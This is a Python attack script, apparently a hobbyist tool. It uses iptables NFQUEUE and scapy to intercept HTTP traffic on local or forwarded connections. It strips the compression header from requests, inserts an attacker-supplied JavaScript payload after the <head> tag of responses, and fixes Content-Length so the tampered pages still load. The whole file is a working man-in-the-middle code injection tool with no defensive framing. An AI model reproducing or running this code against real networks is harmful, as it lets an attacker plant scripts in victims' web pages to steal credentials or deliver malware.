#! /usr/bin/env python

import argparse
import os
import subprocess
import netfilterqueue
import scapy.all as scapy
import re


def getArg():
    parser = argparse.ArgumentParser("File Sniffer")
    parser.add_argument("-q", "--queue-number", type=int, required=True, dest="queueNumber", metavar="",
                        help="[?] Number of queue")
    parser.add_argument("-s", "--script", required=True, type=str, dest="CIscript", metavar="",
                        help="[?] Injectable script")
    parser.add_argument("-p", "--port", type=int, nargs='+', required=False, default=[80], dest="portList", metavar="",
                        help="[?] Input target app port, you can use pool of port. Default - 80")
    parser.add_argument("-u", "--usage", type=int, required=False, default=0, dest="usage", metavar="",
                        help="[?] Local or Public usage (iptables settings). 0 - Local; Else Public")
    parser.add_argument("-e", "--print-traceback", type=int, required=False, default=0, dest="error", metavar="",
                        help="[?] Print traceback. 0 - No; Else Yes")
    return parser.parse_args()

def getPorts(arg):
    if isinstance(arg, list):
        return arg
    return [arg]


if "script" in getArg().CIscript:
    injectionScript = getArg().CIscript
else:
    injectionScript = '<script>' + getArg().CIscript + '</script>'

ack_list = []
tag = "<head>"
byteTag = tag.encode('utf-8', errors='ignore')


def testRetrFix(scapy_packet, new_load):
    ip_layer = scapy_packet.getlayer(scapy.IP)
    tcp_layer = scapy_packet.getlayer(scapy.TCP)

    scapy_packet[scapy.IP].dst = ip_layer.dst
    scapy_packet[scapy.IP].src = ip_layer.src

    scapy_packet[scapy.TCP].dport = tcp_layer.dport
    scapy_packet[scapy.TCP].sport = tcp_layer.sport
    scapy_packet[scapy.TCP].seq = tcp_layer.seq
    scapy_packet[scapy.TCP].ack = tcp_layer.ack
    scapy_packet[scapy.TCP].flags = tcp_layer.flags

    new_packet = (scapy.IP(dst=ip_layer.dst, src=ip_layer.src) /
                  scapy.TCP(dport=tcp_layer.dport, sport=tcp_layer.sport, seq=tcp_layer.seq, ack=tcp_layer.ack,
                            flags=tcp_layer.flags) /
                  new_load)

    return new_packet


def modify_load(scapy_packet, new_load):
    scapy_packet[scapy.Raw].load = new_load
    del scapy_packet[scapy.IP].len
    del scapy_packet[scapy.IP].chksum
    del scapy_packet[scapy.TCP].chksum

    return scapy_packet


def decodingLoad(scapy_packet):
    print("Decoding...")
    load = scapy_packet[scapy.Raw].load.decode('utf-8', errors='ignore')
    new_load = re.sub('Accept-Encoding:.*?\\r\\n', '', load)

    return modify_load(scapy_packet, new_load.encode('utf-8', errors='ignore'))


def CI(load):
    load = load.decode("utf-8")
    if tag in load:
        print("Injecting...")
        load = load.replace(tag, tag + injectionScript)

    return load.encode("utf-8", errors='ignore')


def packetProccess(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    try:
        if scapy_packet.haslayer(scapy.Raw):

            if scapy_packet.haslayer(scapy.TCP):
                load = scapy_packet[scapy.Raw].load

                for port in getPorts(getArg().portList):

                    if scapy_packet[scapy.TCP].dport == port:
                        print("Request")
                        new_packet = decodingLoad(scapy_packet)
                        packet.set_payload(bytes(new_packet))


                    elif scapy_packet[scapy.TCP].sport == port:
                        print("Response")

                        if b'Content-Length' in load:
                            print("Change Content-Length")
                            contentLength = re.search(b'Content-Length:\s(\d*)', load)
                            if contentLength:
                                contentLengthNumber = contentLength.group(1).decode('utf-8')
                                newContentLength = int(contentLengthNumber) + len(injectionScript)
                                load = load.replace(contentLengthNumber.encode('utf-8'),
                                                    str(newContentLength).encode('utf-8'))

                        if byteTag in load:
                            packet.set_payload(bytes(testRetrFix(scapy_packet, CI(load))))

    except Exception as e:
        if getArg().error == 0:
            print(e)
        else:
            # subprocess.call(["iptables", "--flush"])

            if getArg().usage == 0:
                subprocess.call(["iptables", "-D", "OUTPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
                subprocess.call(["iptables", "-D", "INPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
            else:
                subprocess.call(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])

            print(e.with_traceback())
    packet.accept()


def fileSnif():
    if os.getuid() != 0:
        print("Use super user mod")
        exit()

    if getArg().usage == 0:
        subprocess.call(["iptables", "-I", "OUTPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
        subprocess.call(["iptables", "-I", "INPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
        print("Usage: Local")
        print("-" * 20)
    else:
        subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
        print("Usage: Public")
        print("-" * 20)

    queue = netfilterqueue.NetfilterQueue()
    queue.bind(getArg().queueNumber, packetProccess)
    queue.run()


if __name__ == '__main__':
    try:
        print(f"Ports: {getArg().portList}")
        print("Traceback: Yes" if getArg().error else "Traceback: No")
        print(f"Script: {injectionScript}")
        fileSnif()

    except KeyboardInterrupt:
        # subprocess.call(["iptables", "--flush"])
        if getArg().usage == 0:
            subprocess.call(["iptables", "-D", "OUTPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
            subprocess.call(["iptables", "-D", "INPUT", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
        else:
            subprocess.call(["iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", f"{getArg().queueNumber}"])
        print("\nDetected ctrl + C")
        exit()